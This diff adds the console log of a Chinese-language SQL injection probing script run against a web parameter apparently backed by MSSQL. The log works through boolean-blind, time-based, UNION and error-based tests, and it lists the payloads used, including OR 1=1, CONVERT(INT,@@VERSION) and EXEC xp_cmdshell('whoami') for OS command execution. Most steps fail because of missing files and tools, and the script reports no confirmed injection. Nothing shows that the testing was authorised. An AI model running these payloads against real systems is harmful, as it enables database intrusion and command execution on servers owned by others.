@@ -1,0 +1,110 @@
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🔥🔥🔥 SQL注入深度挖掘 - 内容差异分析
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+[1] 获取多个基线对比...
+  基线1: 4205 bytes
+  基线2: 4205 bytes
+  基线3: 4205 bytes
+  ✅ 基线稳定（完全相同）
+
+[2] 布尔盲注 - 内容差异分析...
+ultimate_sql_deep_analysis.sh: line 46: bool_true.html: No such file or directory
+ultimate_sql_deep_analysis.sh: line 47: bool_false.html: No such file or directory
+  基线:    4205 bytes
+  True:     bytes (差异: -4205)
+  False:    bytes (差异: -4205)
+  ⚠️  True和False响应完全相同 - 可能不是布尔盲注
+
+[3] 提取固定内容部分...
+  baseline_1.html: <span id="lblNote"><b><font color="#FF3300"></font></b></span>
+  bool_true.html: 
+grep: bool_true.html: No such file or directory
+  bool_false.html: 
+grep: bool_false.html: No such file or directory
+
+[4] 时间盲注 - 精确计时测试...
+  正常请求: ultimate_sql_deep_analysis.sh: line 92: bc: command not found
+0.000秒
+  WAITFOR DELAY 5秒: ultimate_sql_deep_analysis.sh: line 102: bc: command not found
+0.000秒
+ultimate_sql_deep_analysis.sh: line 105: bc: command not found
+  时间差异: 0.000秒
+ultimate_sql_deep_analysis.sh: line 108: bc: command not found
+
+[5] UNION注入 - 详细内容分析...
+  测试 1 列:
+ultimate_sql_deep_analysis.sh: line 126: union_1cols_detailed.html: No such file or directory
+    大小:  bytes
+grep: union_1cols_detailed.html: No such file or directory
+grep: union_1cols_detailed.html: No such file or directory
+  测试 2 列:
+ultimate_sql_deep_analysis.sh: line 126: union_2cols_detailed.html: No such file or directory
+    大小:  bytes
+grep: union_2cols_detailed.html: No such file or directory
+grep: union_2cols_detailed.html: No such file or directory
+  测试 3 列:
+ultimate_sql_deep_analysis.sh: line 126: union_3cols_detailed.html: No such file or directory
+    大小:  bytes
+grep: union_3cols_detailed.html: No such file or directory
+grep: union_3cols_detailed.html: No such file or directory
+  测试 4 列:
+ultimate_sql_deep_analysis.sh: line 126: union_4cols_detailed.html: No such file or directory
+    大小:  bytes
+grep: union_4cols_detailed.html: No such file or directory
+grep: union_4cols_detailed.html: No such file or directory
+  测试 5 列:
+ultimate_sql_deep_analysis.sh: line 126: union_5cols_detailed.html: No such file or directory
+    大小:  bytes
+grep: union_5cols_detailed.html: No such file or directory
+grep: union_5cols_detailed.html: No such file or directory
+
+[6] 错误注入 - 触发详细SQL错误...
+  测试: MAU2'...
+  测试: MAU2''...
+  测试: MAU2'''...
+  测试: MAU2' OR 1=1--...
+ultimate_sql_deep_analysis.sh: line 170: error_e8440591dad63d57f588a2e8b12f5e2d.html: No such file or directory
+grep: error_e8440591dad63d57f588a2e8b12f5e2d.html: No such file or directory
+grep: error_e8440591dad63d57f588a2e8b12f5e2d.html: No such file or directory
+  测试: MAU2' OR '1'='1...
+ultimate_sql_deep_analysis.sh: line 170: error_f0eb233f6645f2fcbf5725bdb5463325.html: No such file or directory
+grep: error_f0eb233f6645f2fcbf5725bdb5463325.html: No such file or directory
+grep: error_f0eb233f6645f2fcbf5725bdb5463325.html: No such file or directory
+  测试: MAU2' AND 1=CONVERT(INT,@@VERSION)--...
+ultimate_sql_deep_analysis.sh: line 170: error_6132148b461da4c9c73c506bfaee713f.html: No such file or directory
+grep: error_6132148b461da4c9c73c506bfaee713f.html: No such file or directory
+grep: error_6132148b461da4c9c73c506bfaee713f.html: No such file or directory
+  测试: MAU2' AND 1=CAST(@@VERSION AS INT)--...
+ultimate_sql_deep_analysis.sh: line 170: error_2b66d532b0a2ef4a131df26215c5c9d0.html: No such file or directory
+grep: error_2b66d532b0a2ef4a131df26215c5c9d0.html: No such file or directory
+grep: error_2b66d532b0a2ef4a131df26215c5c9d0.html: No such file or directory
+  测试: MAU2' UNION SELECT 1,2,3,4,5,6,7,8,9,10-...
+ultimate_sql_deep_analysis.sh: line 170: error_3d86d550a6e85e8a81ee7eb58cc79a8c.html: No such file or directory
+grep: error_3d86d550a6e85e8a81ee7eb58cc79a8c.html: No such file or directory
+grep: error_3d86d550a6e85e8a81ee7eb58cc79a8c.html: No such file or directory
+  测试: MAU2'; SELECT @@VERSION--...
+ultimate_sql_deep_analysis.sh: line 170: error_339af7b18301f681171e666a32888b45.html: No such file or directory
+grep: error_339af7b18301f681171e666a32888b45.html: No such file or directory
+grep: error_339af7b18301f681171e666a32888b45.html: No such file or directory
+  测试: MAU2'; EXEC xp_cmdshell('whoami')--...
+ultimate_sql_deep_analysis.sh: line 170: error_b43448c5b08699bd634620d032e33010.html: No such file or directory
+grep: error_b43448c5b08699bd634620d032e33010.html: No such file or directory
+grep: error_b43448c5b08699bd634620d032e33010.html: No such file or directory
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📊 SQL注入深度分析完成
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🔥 发现的SQL注入:
+  无确认的注入
+
+📁 所有测试文件:
+-rw-r--r-- 1 ubuntu ubuntu 4.2K Nov 17 16:45 baseline_1.html
+-rw-r--r-- 1 ubuntu ubuntu 4.2K Nov 17 16:45 baseline_2.html
+-rw-r--r-- 1 ubuntu ubuntu 4.2K Nov 17 16:45 baseline_3.html
+-rw-r--r-- 1 ubuntu ubuntu 4.2K Nov 17 16:20 baseline_cmd.html
+-rw-r--r-- 1 ubuntu ubuntu 4.4K Nov 17 16:45 error_4984490dad2fc0efa5601a36df87958a.html
+-rw-r--r-- 1 ubuntu ubuntu 4.4K Nov 17 16:45 error_d24d54158aa611e25c7d458436392928.html
+-rw-r--r-- 1 ubuntu ubuntu 4.4K Nov 17 16:45 error_f0650a9075c06a43e540a5abdd291544.html
+-rw-r--r-- 1 ubuntu ubuntu 7.7K Nov 17 16:39 error_viewstate.html
+-rw-r--r-- 1 ubuntu ubuntu 4.4K Nov 17 16:39 error_webconfig.html
